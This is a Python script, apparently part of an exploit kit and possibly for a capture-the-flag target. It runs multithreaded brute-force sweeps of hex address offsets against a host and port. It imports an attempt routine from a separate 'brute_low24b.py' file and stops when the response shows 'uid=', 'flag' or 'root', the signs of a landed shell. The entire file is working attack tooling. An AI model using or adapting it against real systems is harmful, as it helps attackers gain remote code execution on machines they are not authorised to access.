import sys, time, threading, queue
HOST=sys.argv[1]; PORT=int(sys.argv[2]); THREADS=int(sys.argv[3])
START=int(sys.argv[4],16); END=int(sys.argv[5],16); STEP=int(sys.argv[6],16)
src=open('brute_low24b.py').read().split("d=START; n=0")[0]
ns={}; exec(src,ns); attempt=ns['attempt']
q=queue.Queue()
d=START
while d<=END:
    q.put(d); d+=STEP
lock=threading.Lock(); stop=[False]; done=[0]; t0=time.time()
def worker():
    while not stop[0]:
        try: delta=q.get_nowait()
        except queue.Empty: return
        r,out=attempt(delta)
        with lock:
            done[0]+=1
            if b'uid=' in out or b'flag' in out or b'root' in out:
                print('*** HIT delta=%#x %s'%(delta,out[:300]), flush=True); stop[0]=True; return
            if done[0]%32==0:
                print('%d/%d %ds'%(done[0], (END-START)//STEP+1, int(time.time()-t0)), flush=True)
            if out==b'' and r=='ERR': pass
ts=[threading.Thread(target=worker,daemon=True) for _ in range(THREADS)]
[t.start() for t in ts]
[t.join() for t in ts]
print('sweep done', done[0], 'in', int(time.time()-t0), 's', flush=True)
